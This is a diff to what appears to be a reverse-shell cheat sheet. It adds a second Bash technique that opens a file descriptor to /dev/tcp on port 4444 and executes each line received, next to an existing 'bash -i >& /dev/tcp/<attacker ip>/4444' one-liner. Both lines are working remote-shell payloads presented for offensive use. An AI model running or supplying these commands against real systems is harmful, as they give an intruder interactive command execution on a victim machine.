@@ -19,7 +19,12 @@ If you require to use old versions of netcat you can do so by
 ### 2. Bash
 
 	bash -i >& /dev/tcp/<attacker ip>/4444 0>&1  
+    
+Or using some bash-skillz -
+	exec 5<>/dev/tcp/127.0.0.1/4444
+	cat <&5 | while read line; do $line 2>&5 >&5; done
 
+Creates an FD (File descriptor) 5 and does a bunch of piping-fu
 ### 3. PERL  
 Good ol' PERL, nearly every system has it and is a cornerstone of utility -  
 	
